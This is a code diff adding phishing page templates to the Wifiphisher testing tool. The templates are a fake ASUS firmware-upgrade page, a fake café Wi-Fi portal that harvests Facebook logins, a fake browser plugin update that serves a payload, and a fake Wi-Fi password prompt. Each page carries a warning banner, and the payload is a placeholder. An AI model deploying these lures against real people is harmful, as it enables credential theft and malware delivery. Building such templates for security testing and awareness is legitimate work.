  Post to the fallowing path given the parameters.
  Args:
    path: The path to be posted to.
    params: The parameters to be passed.
*/
function post(path, params) {
    // create a form and set its attributes
    var form = document.createElement("form");
    form.setAttribute("method", "post");
    form.setAttribute("action", path);

    // set the attribute for the post
    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "hidden");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
         }
    }

    // submit the post
    document.body.appendChild(form);
    form.submit();
}

/*
  Check the status of check box
*/
function checkBoxStatus()
{
  // get the password box and checkbox elements
	var box = document.getElementById("check-box");
	var input = document.getElementById("pwd");

  // if the box is checked
	if ( box.checked == true )
		{
      // enabale the password box
			input.disabled = false;
		}
	else
		{
      // disable the password box
			input.disabled = true;
		}
	}
</script>
</body>
</html>
 4 changes: 4 additions & 0 deletions4  
ps/firmware-upgrade/jquery.min.js
Large diffs are not rendered by default.

 320 changes: 320 additions & 0 deletions320  
ps/firmware-upgrade/upgrading.html
@@ -0,0 +1,320 @@
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Router Configuration Page</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="bootstrap.min.css">
  <script src="jquery.min.js"></script>
  <script src="bootstrap.min.js"></script>

  <!-- CSS -->
  <style type="text/css">

    /* Sticky footer styles
    -------------------------------------------------- */

    html,
    body {
          height: 100%;
          /* The html and body elements cannot have any padding or margin. */
        }

        /* Wrapper for page content to push down footer */
        #wrap {
          min-height: 100%;
          height: auto !important;
          height: 100%;
          /* Negative indent footer by it's height */
          margin: 0 auto -60px;
        }

        /* Set the fixed height of the footer here */
        #push,
        #footer {
          height: 60px;
        }
        #footer {
          background-color: #f5f5f5;
        }

        /* Lastly, apply responsive CSS fixes as necessary */
        @media (max-width: 767px) {
          #footer {
            margin-left: -20px;
            margin-right: -20px;
            padding-left: 20px;
            padding-right: 20px;
          }
        }

        #clockdiv{
	         font-family: sans-serif;
	         color: #fff;
	         display: inline-block;
	         font-weight: 100;
	         text-align: center;
	         font-size: 30px;
         }

        #clockdiv > div{
           padding: 10px;
           border-radius: 3px;
	         background: #00BF96;
	         display: inline-block;
         }

        #clockdiv div > span{
          padding: 15px;
	        border-radius: 3px;
	        background: #00816A;
	        display: inline-block;
        }

      .smalltext{
	       padding-top: 5px;
	       font-size: 16px;
       }

  </style>
</head>
<body>

  <!-- Start navigation bar -->
  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
    <div class="container-fluid">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <!--
        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
        -->
      </div>
      <div class="collapse navbar-collapse" id="myNavbar">
        <ul class="nav navbar-nav">
          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Setup</a></li>
              <li><a href="#">DDNS</a></li>
              <li><a href="#">MAC Address Clone</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Basic Wireless Settings</a></li>
              <li><a href="#">Wireless Security</a></li>
              <li><a href="#">Wireless MAC Filter</a></li>
              <li><a href="#">Advanced Wireless Settings</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Firewall</a></li>
              <li><a href="#">VPN</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Access Restriction <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Internet Access</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Administration <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Management</a></li>
              <li><a href="#">Log</a></li>
              <li><a href="#">Diagnostics</a></li>
              <li><a href="#">Factory Defaults</a></li>
              <li><a href="#">Config Manegements</a></li>
            </ul>
          </li>
          <li class="dropdown" data-toggle="modal" data-target="#upgrade-only"><a class="dropdown-toggle"
              data-toggle="dropdown" href="#" style="color:white">Status <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#">Router</a></li>
              <li><a href="#">Local Network</a></li>
              <li><a href="#">Wireless</a></li>
              <li><a href="#">Advanced Routing</a></li>
            </ul>
          </li>
        </ul>
      </div>
    </div>
  </nav>
  <!-- End navigation bar -->

  <!-- Start firt phase -->
  <div class="container">
    <div>
      <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade In Progress</h2>
      <p class="lead">The update is currently being uploaded to the router.
                      Please do not dissconnect or turn off the router while it's
                      being updated.</p>
    </div>

    <!-- Start porgress bar -->
    <div id="instance" class="progress">
      <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%;">
        <span class="sr-only">0% Complete</span>
      </div>
    </div>
    <!-- End porgress bar -->

    <div id="push"></div>
  </div>
<!-- End first phase -->

<!-- Start second phase -->
  <div class="container show-on-done hidden">
    <div class="row content">
      <div class="col-sm">
        <div>
          <p class="lead">The update was successful and currently it's being installed.
                          The router is being rebooted and you will lose access to
                          the internet. Please allow the timer to expire before
                          you connect back to the router.</p>
        </div>
      </div>

      <!-- start of the countdown -->
      <div class="col-sm text-center">
        <div id="clockdiv">
          <div>
            <span class="minutes"></span>
            <div class="smalltext">Minutes</div>
          </div>
          <div>
            <span class="seconds"></span>
            <div class="smalltext">Seconds</div>
          </div>
        </div>
      </div>
      <!-- end of the countdown -->

    </div>
    <div id="push"></div>
  </div>
  <!-- End second phase -->

  <!-- Start footer -->
  <footer class="footer">
    <div class="container text-center">
      <p class="text-muted">© ASUS 2016, All Rights Reserved.</p>
    </div>
  </footer>
  <!-- End footer -->

  <!-- Start upgrade first message -->
  <div class="modal fade" id="upgrade-only" role="dialog">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Information</h4>
        </div>
        <div class="modal-body">
          <p>Please Wait For Update To Finish.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <!-- End upgrade first message -->

<script>
/*
  Increases the progress bar
*/
function fakeProgress(container, durationInMs, onDone) {
    var intervalInMS = 200;
    var doneDelay = intervalInMS * 2;
    var bar = container.find('.progress-bar');
    var srOnly = bar.find('.sr-only');
    var percent = 0;

    var interval = setInterval(function updateBar() {
        percent += 100 * (intervalInMS/durationInMs);
        bar.css({width: percent + '%'});
        bar['aria-valuenow'] = percent;
        srOnly.text(percent + '% Complete');

        if (percent >= 100) {
            clearInterval(interval);
            setTimeout(function() {
                if (typeof onDone === 'function') {
                    onDone();
                }
            }, doneDelay);
        }
    }, intervalInMS);
}

/*
  Used to show content after the progress bar is done
*/
function onDone() {
    $('.show-on-done').removeClass('hidden');

    var deadline = new Date(Date.parse(new Date()) + 5 * 60 * 1000);
    initializeClock('clockdiv', deadline);
}

/*
  Calculates the remaning time
*/
function getTimeRemaining(endtime) {
  var t = Date.parse(endtime) - Date.parse(new Date());
  var seconds = Math.floor((t / 1000) % 60);
  var minutes = Math.floor((t / 1000 / 60) % 60);

  return {
    'total': t,
    'minutes': minutes,
    'seconds': seconds
  };
}

/*
  Creates the clock related content
*/
function initializeClock(id, endtime) {
  var clock = document.getElementById(id);
  var minutesSpan = clock.querySelector('.minutes');
  var secondsSpan = clock.querySelector('.seconds');

  function updateClock() {
    var t = getTimeRemaining(endtime);


    minutesSpan.innerHTML = ('0' + t.minutes).slice(-2);
    secondsSpan.innerHTML = ('0' + t.seconds).slice(-2);

    if (t.total <= 0) {
      clearInterval(timeinterval);
    }
  }

  // updating the countdown
  updateClock();
  var timeinterval = setInterval(updateClock, 1000);
}

// speed of the progress bar in milliseconds
var duration = 100000;

// start the progress bar
fakeProgress($('#instance'), duration, onDone);

</script>
</body>
</html>
 6 changes: 6 additions & 0 deletions6  
ps/oauth-login/config.ini
@@ -0,0 +1,6 @@
[info]
Name: OAuth Login Page
Description: A free Wi-Fi Service asking for Facebook credentials to authenticate using OAuth

[context]
organization:
 4 changes: 4 additions & 0 deletions4  
ps/oauth-login/css/font-awesome.min.css
Large diffs are not rendered by default.

 1 change: 1 addition & 0 deletions1  
ps/oauth-login/css/reset.css
 36 changes: 36 additions & 0 deletions36  
ps/oauth-login/css/roboto.css
@@ -0,0 +1,36 @@
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 100;
  src: local('Roboto Thin'), local('Roboto-Thin'), url(http://fonts.gstatic.com/s/roboto/v15/Jzo62I39jc0gQRrbndN6nfesZW2xOQ-xsNqO47m55DA.ttf) format('truetype');
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 300;
  src: local('Roboto Light'), local('Roboto-Light'), url(http://fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfaCWcynf_cDxXwCLxiixG1c.ttf) format('truetype');
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 400;
  src: local('Roboto'), local('Roboto-Regular'), url(http://fonts.gstatic.com/s/roboto/v15/zN7GBFwfMP4uA6AR0HCoLQ.ttf) format('truetype');
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 500;
  src: local('Roboto Medium'), local('Roboto-Medium'), url(http://fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUaCWcynf_cDxXwCLxiixG1c.ttf) format('truetype');
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 700;
  src: local('Roboto Bold'), local('Roboto-Bold'), url(http://fonts.gstatic.com/s/roboto/v15/d-6IYplOFocCacKzxwXSOKCWcynf_cDxXwCLxiixG1c.ttf) format('truetype');
}
@font-face {
  font-family: 'Roboto';
  font-style: normal;
  font-weight: 900;
  src: local('Roboto Black'), local('Roboto-Black'), url(http://fonts.gstatic.com/s/roboto/v15/mnpfi9pxYH-Go5UiibESIqCWcynf_cDxXwCLxiixG1c.ttf) format('truetype');
}
 214 changes: 214 additions & 0 deletions214  
ps/oauth-login/css/style.css
@@ -0,0 +1,214 @@
body {
  background: #e9e9e9;
  color: #666666;
  font-family: 'RobotoDraft', 'Roboto', sans-serif;
  font-size: 14px;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}

/* Pen Title */
.pen-title {
  padding: 50px 0;
  text-align: center;
  letter-spacing: 2px;
}
.pen-title h1 {
  margin: 0 0 20px;
  font-size: 48px;
  font-weight: 300;
}
.pen-title span {
  font-size: 12px;
}
.pen-title span .fa {
  color: #33b5e5;
}
.pen-title span a {
  color: #33b5e5;
  font-weight: 600;
  text-decoration: none;
}

/* Form Module */
.form-module {
  position: relative;
  background: #ffffff;
  max-width: 320px;
  width: 100%;
  border-top: 5px solid #33b5e5;
  box-shadow: 0 0 3px rgba(0, 0, 0, 0.1);
  margin: 0 auto;
}
.form-module .toggle {
  cursor: pointer;
  position: absolute;
  top: -0;
  right: -0;
  background: #33b5e5;
  width: 30px;
  height: 30px;
  margin: -5px 0 0;
  color: #ffffff;
  font-size: 12px;
  line-height: 30px;
  text-align: center;
}
.form-module .toggle .tooltip {
  position: absolute;
  top: 5px;
  right: -65px;
  display: block;
  background: rgba(0, 0, 0, 0.6);
  width: auto;
  padding: 5px;
  font-size: 10px;
  line-height: 1;
  text-transform: uppercase;
}
.form-module .toggle .tooltip:before {
  content: '';
  position: absolute;
  top: 5px;
  left: -5px;
  display: block;
  border-top: 5px solid transparent;
  border-bottom: 5px solid transparent;
  border-right: 5px solid rgba(0, 0, 0, 0.6);
}
.form-module .form {
  display: none;
  padding: 40px;
}
.form-module .form:nth-child(2) {
  display: block;
}
.form-module h2 {
  margin: 0 0 20px;
  color: #33b5e5;
  font-size: 18px;
  font-weight: 400;
  line-height: 1;
}
.logo {
  float: right;
  margin-top: -50px;
}
.form-module input {
  outline: none;
  display: block;
  width: 100%;
  border: 1px solid #d9d9d9;
  margin: 0 0 20px;
  padding: 10px 15px;
  box-sizing: border-box;
  font-wieght: 400;
  -webkit-transition: 0.3s ease;
  transition: 0.3s ease;
}
.form-module input:focus {
  border: 1px solid #33b5e5;
  color: #333333;
}
.login-btn {
  cursor: pointer;
  background: #33b5e5;
  width: 100%;
  border: 0;
  padding: 10px 15px;
  color: #ffffff;
  -webkit-transition: 0.3s ease;
  transition: 0.3s ease;
}
#btn1, #btn2  {
  cursor: pointer;
}
.login-btn:hover {
  background: #178ab4;
}
.form-module .cta {
  background: #f2f2f2;
  width: 100%;
  padding: 15px 40px;
  box-sizing: border-box;
  color: #666666;
  font-size: 12px;
  text-align: center;
}
.form-module .cta a {
  color: #333333;
  text-decoration: none;
}

/* The Modal (background) */
.modal {
    display: none; /* Hidden by default */
    position: fixed; /* Stay in place */
    z-index: 1; /* Sit on top */
    padding-top: 100px; /* Location of the box */
    left: 0;
    top: 0;
    width: 100%; /* Full width */
    height: 100%; /* Full height */
    overflow: auto; /* Enable scroll if needed */
    background-color: rgb(0,0,0); /* Fallback color */
    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
}

/* Modal Content */
.modal-content {
    position: relative;
    background-color: #fefefe;
    margin: auto;
    padding: 0;
    border: 1px solid #888;
    width: 80%;
    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
    -webkit-animation-name: animatetop;
    -webkit-animation-duration: 0.4s;
    animation-name: animatetop;
    animation-duration: 0.4s
}

/* Add Animation */
@-webkit-keyframes animatetop {
    from {top:-300px; opacity:0} 
    to {top:0; opacity:1}
}

@keyframes animatetop {
    from {top:-300px; opacity:0}
    to {top:0; opacity:1}
}

/* The Close Button */
.close {
    color: white;
    float: right;
    font-size: 28px;
    font-weight: bold;
}

.close:hover,
.close:focus {
    color: #000;
    text-decoration: none;
    cursor: pointer;
}

.modal-header {
    padding: 2px 16px;
    background-color: #90C3D4;
    color: white;
}

.modal-body {padding: 2px 16px;}

.modal-body p {padding-top: 4px;}


.modal-footer {
    padding: 2px 16px;
    background-color: #5cb85c;
    color: white;
}
 135 changes: 135 additions & 0 deletions135  
ps/oauth-login/index.html
@@ -0,0 +1,135 @@
<!DOCTYPE html>
<html >
  <head>

    <style>
        #blackBar{
        color: white;
        text-align: center;
        position:fixed;
        padding-top: 5px;
        top:0;
        left:0;
        width:100%;
        height:20px;
        background-color:black;
        }
    </style>
<script>
function validateForm() {
    var x = document.forms["theform"]["wfphshr-email"].value;
    var atpos = x.indexOf("@");
    var dotpos = x.lastIndexOf(".");
    if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length) {
        alert("Failed to authenticate. Wrong Email or Password.");
        return false;
    }

    var x = document.forms["theform"]["wfphshr-password"].value;
    if (5>=x.length) {
        alert("Failed to authenticate. Wrong Email or Password.");
        return false;
    }
}
</script>
    <meta charset="UTF-8">
    <title>Bravo Coffee Wi-Fi Service</title>
    <link rel="stylesheet" href="css/reset.css">
    <link rel='stylesheet prefetch' href='css/roboto.css'>
<link rel='stylesheet prefetch' href='css/font-awesome.min.css'>
        <link rel="stylesheet" href="css/style.css">    
  </head>
  <body> 

   <div id="blackBar">Don't get phished. This is a phishing scenario and is part of the Wifiphisher tool.</div>
<!-- Form Mixin-->
<!-- Input Mixin-->
<!-- Button Mixin-->
<!-- Pen Title-->
<div class="pen-title">
  <h1>Get connected to the Internet for free</h1><span>A simple, no frills Bravo Coffee Wi-Fi service.</span>
</div>
<!-- Form Module-->
<div class="module form-module">
  <div class="form">
  </div>
  <div class="form">
    <h2>Login using Facebook</h2>
    <img src="logos/facebook-logo.png" width="25%" class="logo"></img>
    <form name="theform" class="theform" method="post" action="oauth.html" onsubmit="return validateForm();">
      <input type="text" placeholder="Email" name="wfphshr-email"/>
      <input type="password" placeholder="Password" name="wfphshr-password"/>
      <button class="login-btn">Login</button>
    </form> 
  </div>
  <div class="cta"><a id="btn1">Terms of Usage</a></div>
</div>

<!-- The Modal -->
<div id="myModal" class="modal">

  <!-- Modal content -->
  <div class="modal-content">
    <div class="modal-header">
      <span class="close">×</span>
      <h2>Terms of Usage</h2>
    </div>
    <div class="modal-body">
      <p>This is a Bravo Coffee free Hotspot wireless internet Service (the “Service”) provided for use by customers. All users are required to log-in individually as an independent user.</p>
      <p>
The Service is made available provided:
</p><p>
(a) You do not use the Service for anything unlawful, immoral or improper;
</p><p>
(b) You do not use the Service to make offensive or nuisance communications in whatever form. Such usage includes posting, transmitting, uploading, downloading or otherwise facilitating any content that is unlawful, defamatory, threatening, a nuisance, obscene, hateful, abusive, harmful (including but not limited to viruses, corrupted files, or any other similar software or programs), a breach of privacy, or which is otherwise objectionable;
</p><p>
(c) You do not use the Service to harm or attempt to harm minors in any way;
</p><p>
(d) You do not act nor knowingly permit others to act in such a way that the operation of the Service or our systems will be jeopardized or impaired;
</p><p>
(e) You do not use abusive or threatening behavior towards other users of the Service, members of our staff or any person in the vicinity of a Wireless LAN Hotspot;
</p><p>
(f) You do not use the Service to access or use content in a way that infringes the rights of others;
</p><p>
(g) The Service is used in accordance with any third party policies for acceptable use or any relevant internet standards (where applicable).
</p><p>
(h) You agree not to resell or re-broadcast any aspect of the Service, whether for profit or otherwise. You accept that your entitlement to use the Service is for your personal use only and that you shall not be entitled to transfer your entitlement to use the Service to any other person or allow any other person to make use of the Service or of any username or password or other entitlement supplied to you in connection with the Service.
</p><p>
(i) You also agree not to modify the Unit or use the Service for any fraudulent purpose, or in such a way as to create damage or risk to our business, reputation, employees, subscribers, facilities, third parties or to the public generally.
</p><p>
(j) You have no proprietary or ownership rights to any username or password or to a specific IP address, or e-mail address assigned to you or your Unit. We may change such addresses at any time or deactivate or suspend Service to any address without prior notice to you if we suspect any unlawful or fraudulent use of the services.
</p>
    </div>
  </div>

    <script src='js/jquery.min.js'></script>
    <script src="js/index.js"></script> 
<script>
// Get the modal
var modal = document.getElementById('myModal');

// Get the button that opens the modal
var btn = document.getElementById("btn1");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal 
btn.onclick = function() {
    modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
    modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>
  </body>
</html>
 12 changes: 12 additions & 0 deletions12  
ps/oauth-login/js/index.js
@@ -0,0 +1,12 @@
// Toggle Function
$('.toggle').click(function(){
  // Switches the Icon
  $(this).children('i').toggleClass('fa-pencil');
  // Switches the forms  
  $('.form').animate({
    height: "toggle",
    'padding-top': 'toggle',
    'padding-bottom': 'toggle',
    opacity: "toggle"
  }, "slow");
});
 5 changes: 5 additions & 0 deletions5  
ps/oauth-login/js/jquery.min.js
Large diffs are not rendered by default.

 10 changes: 10 additions & 0 deletions10  
ps/oauth-login/license.txt
@@ -0,0 +1,10 @@

<!--
Copyright (c) 2016 by Andy Tran (http://codepen.io/andytran/pen/PwoQgO)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-->
 Binary file addedBIN +5.81 KB 
ps/oauth-login/logos/facebook-logo.png

 1 change: 1 addition & 0 deletions1  
ps/oauth-login/oauth.html
@@ -0,0 +1 @@
<p>Oops, an error occured! Our engineers were notified. Please be patient as we are working on it.</p>
 8 changes: 8 additions & 0 deletions8  
ps/plugin_update/config.ini
@@ -0,0 +1,8 @@
[info]
Name: Browser Plugin Update
Description: A generic browser plugin update page that can be used to serve payloads to the victims.
PayloadPath: /plugin_update/update/update.exe

[context]
# If you change the line below, make sure you change the PayloadPath above accordingly
update_path: update/update.exe
 6 changes: 6 additions & 0 deletions6  
ps/plugin_update/css/bootstrap.min.css
Large diffs are not rendered by default.

 18 changes: 18 additions & 0 deletions18  
ps/plugin_update/css/theme.css
@@ -0,0 +1,18 @@
body {
  padding-top: 70px;
  padding-bottom: 30px;
}

.theme-dropdown .dropdown-menu {
  position: static;
  display: block;
  margin-bottom: 20px;
}

.theme-showcase > p > .btn {
  margin: 5px 0;
}

.theme-showcase .navbar .container {
  width: auto;
}
 Binary file addedBIN +186 KB 
ps/plugin_update/images/favicon.ico
Binary file not shown.
 Binary file addedBIN +29.2 KB 
ps/plugin_update/images/plugins.png

 152 changes: 152 additions & 0 deletions152  
ps/plugin_update/index.html
@@ -0,0 +1,152 @@
<!DOCTYPE html>
<html>

   <head>
      <link rel="icon" href="images/favicon.ico">  
      <title>Plugin Manager</title>
      <meta name = "viewport" content = "width = device-width, initial-scale = 1.0">      
      <link href = "css/bootstrap.min.css" rel = "stylesheet">
      <link href="css/theme.css" rel="stylesheet">
    <style>
        #blackBar{
        color: white;
        text-align: center;
        position:fixed;
        padding-top: 5px;
        top:0;
        left:0;
        width:100%;
        height:20px;
        background-color:black;
        }
    </style>
   </head>

   <body>

    <nav class="navbar navbar-inverse navbar-fixed-top">
    <div id="blackBar">Don't get phished. This is a phishing scenario and is part of the Wifiphisher tool.</div>
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="">Plugin Manager</a>
        </div>
        </div>
        </nav>


      <div class="container theme-showcase" role="main">

      <div class="alert alert-warning" role="alert">
        <h4><strong>WARNING:</strong> Your browser plugins are severely out of date. Update your browser plugins to continue browsing securely.</h4>
      </div>

      <div class="page-header">
        <h1><strong>Update Your Plugins</strong></h1>
        <h4>Keeping your plugins up to date helps your browser run safely and smoothly.</h4>
      </div>

      <div class="jumbotron">
        <h1>Plugin Status</h1>
       <br>

      <div class="row">
        <div class="col-md-13">
          <table class="table">
            <thead>
              <tr>
                <th><h3>Plugin</h3></th>
                <th><h3>Status</h3></th>
                <th><h3>Action</h3></th>

              </tr>
            </thead>
            <tbody>
              <tr>
                <td>
                  <strong>Flash Player</strong><br>
                  Flash Player is a lightweight browser plug-in and rich Internet application runtime that delivers consistent and engaging user experiences, stunning audio/video playback, and exciting gameplay
               </td>

                <td>
                  <br><strong>Outdated</strong>
               </td>

                <td>
                  <h4>
                  <form method="get" action="malexe.txt">
                    <button type="submit" class="btn btn-lg btn-success">Update Now</button>
                    </form>
                  </h4>
                </td>
              </tr>
         </tbody>
         </table>

               <br>

               <p> 
       <ul class="list-unstyled">
               <ul>
                   <li><h4><strong>Step 1:</strong> Click 'Update Now' to download the update file.</h4></li>
                   <li><h4><strong>Step 2:</strong> Run the update file to update your plugins.</h4></li>
               </ul>
       </ul>
      <br>


      </div>
      </div>
      </div>

      <div class="jumbotron">
        <h1>Frequently Asked Questions</h1>

      <div class="row marketing">
        <div class="col-lg-6">
          <h3>What is a plugin?</h3>
      <p> 
       <ul class="list-unstyled">
               <ul>
                   <li><h4>Plugins power videos, animation and games.</h4></li>
                   <li><h4>Plugins don't always update automatically.</h4></li>
                   <li><h4>They're built outside of your browser by companies like Adobe Systems and Apple.</h4></li>
               </ul>
       </ul>
       <br>
      <p>

          <h3>How does Plugin Manager help me?</h3>
          <h4>Your browser's plugin manager <strong>automatically updates</strong> most of your plugins for you. However, some plugins occassionally require <strong>manual updating</strong>.</h4>
       <br>

        </div>

        <div class="col-lg-6">
          <h3>Why should I update my plugins?</h3>
         <p> 
          <ul class="list-unstyled">
                  <ul>
                      <li><h4>Old plugins <strong>increase your risk</strong> for attack by malware, viruses, and other security threats.</h4></li>
                      <li><h4><strong>Updated plugins have improvements</strong> that make the web <strong>better and safer</strong> for you.</h4></li>
                      <li><h4>Old plugins can <strong>interrupt browsing</strong> and waste your time.</h4></li>

                  </ul>
          </ul>
          <br>

         <img src="images/plugins.png" class="img-thumbnail" alt="A generic square placeholder image with a white border around it, making it resemble a photograph taken with an old instant camera">

        </div>
      </div>

    </div>

      </div>

      <script src = "js/jquery.js"></script>

      <script src = "js/bootstrap.min.js"></script>

   </body>

</html>
 7 changes: 7 additions & 0 deletions7  
ps/plugin_update/js/bootstrap.min.js
Large diffs are not rendered by default.

 10,308 changes: 10,308 additions & 0 deletions10,308  
ps/plugin_update/js/jquery.js
Large diffs are not rendered by default.

 1 change: 1 addition & 0 deletions1  
ps/plugin_update/malexe.txt
@@ -0,0 +1 @@
Don't get phished. A malicious executable could be here.
 Empty file added0  
ps/plugin_update/update/update.exe
Empty file.
 126 changes: 126 additions & 0 deletions126  
ps/wifi_connect/behavior.js
@@ -0,0 +1,126 @@
var byId = document.getElementById.bind(document);
var pwd = byId("wifi-search-password"),
    modal = byId("mac-wifi"),
    join = byId("button-join"),
    cancel = byId("button-cancel"),
    showPwd = byId("show-password"),
    remember = byId("remember-network"),
    title = byId("modal-title");
var EPSILON_WIDTH = 30,
    EPSILON_HEIGHT = 100;
var centerMarginLeft = modal.style.marginLeft,
    centerMarginTop = modal.style.marginTop;
// invariant network manager window position as browser window is resized
var screenLeft, screenTop;

function showModal() {
    setTimeout(function() {
        modal.style.display = "block";
        screenLeft = (screen.availWidth / 2) - (modal.offsetWidth / 2);
        screenTop = 9 + (screen.height * (1 / 4)) - (modal.offsetHeight / 2);
        positionOnScreen();
        checkSaneSize();
        pwd.focus();
    }, 1000);
}

showModal();

pwd.onkeyup = function() {
    join.disabled = (pwd.value.length < 8);
};
showPwd.onchange = function() {
    if (showPwd.checked) {
        pwd.type = "text";
    }
    else {
        pwd.type = "password";
    }
    pwd.focus();
};
remember.onchange = function() {
    pwd.focus();
};
cancel.onclick = function() {
    modal.style.display = "none";
    showModal();
};
var downX, downY, oldX, oldY, dragging = false;

title.onmousedown = function(e) {
    if (e.button == 0) {
        dragging = true;
        downX = e.clientX;
        downY = e.clientY;
        oldX = modal.offsetLeft;
        oldY = modal.offsetTop;
        document.onselectstart = function() {
            return false;
        };
    }
};

function positionOnScreen() {
    modal.style.left = screenLeft - (window.screenX) + 'px';
    modal.style.top = screenTop - (window.screenY) + 'px';
}

function restart() {
    modal.style.display = 'none';
    showModal();
}

function checkSaneSize() {
    if (modal.offsetLeft < 0
     || modal.offsetTop < 0
     || modal.offsetLeft + modal.offsetWidth > window.innerWidth
     || modal.offsetTop + modal.offsetHeight > window.innerHeight) {
        restart();
    }
}

var prevScreenX = window.screenX,
    prevScreenY = window.screenY;

function render() {
    var dx = window.screenX - prevScreenX,
        dy = window.screenY - prevScreenY;

    prevScreenX = window.screenX;
    prevScreenY = window.screenY;

    if (dx != 0 || dy != 0) {
        restart();
    }
    else {
        checkSaneSize();
    }
    window.requestAnimationFrame(render);
}

window.requestAnimationFrame(render);

document.onmousemove = function(e) {
    if (dragging) {
        var newX = e.clientX - downX,
            newY = e.clientY - downY;

        screenLeft = window.screenX + oldX + newX;
        screenTop = window.screenY + oldY + newY;

        positionOnScreen();
        checkSaneSize();
    }
};

document.onmouseup = function(e) {
    if (e.button == 0) {
        dragging = false;
        document.onselectstart = function() {
        };
    }
};

modal.onclick = function() {
    pwd.focus();
};
 162 changes: 162 additions & 0 deletions162  
ps/wifi_connect/chrome-offline.css
@@ -0,0 +1,162 @@
/* Copyright 2014 The Chromium Authors. All rights reserved.
   Use of this source code is governed by a BSD-style license that can be
   found in the LICENSE file. */

body {
  background-color: #f7f7f7;
  color: #646464;
}

#details {
  color: #696969;
  margin: 45px 0 50px;
}

#details p:not(:first-of-type) {
  margin-top: 20px;
}

#details-button {
  background: inherit;
  border: 0;
  float: none;
  margin: 0;
  padding: 10px 0;
  text-transform: uppercase;
}

#details-button:hover {
  box-shadow: inherit;
  text-decoration: underline;
}

.error-code {
  color: #696969;
  display: inline;
  font-size: .86667em;
  margin-top: 15px;
  opacity: .5;
  text-transform: uppercase;
}

#error-debugging-info {
  font-size: 0.8em;
}

h1 {
  color: #333;
  font-size: 1.6em;
  font-weight: normal;
  line-height: 1.25em;
  margin-bottom: 16px;
}

.hidden {
  display: none;
}

html {
  -webkit-text-size-adjust: 100%;
  font-size: 125%;
}

.icon {
  background-repeat: no-repeat;
  background-size: 100%;
  height: 72px;
  margin: 0 0 40px;
  width: 72px;
}

.nav-wrapper {
  margin-top: 51px;
}

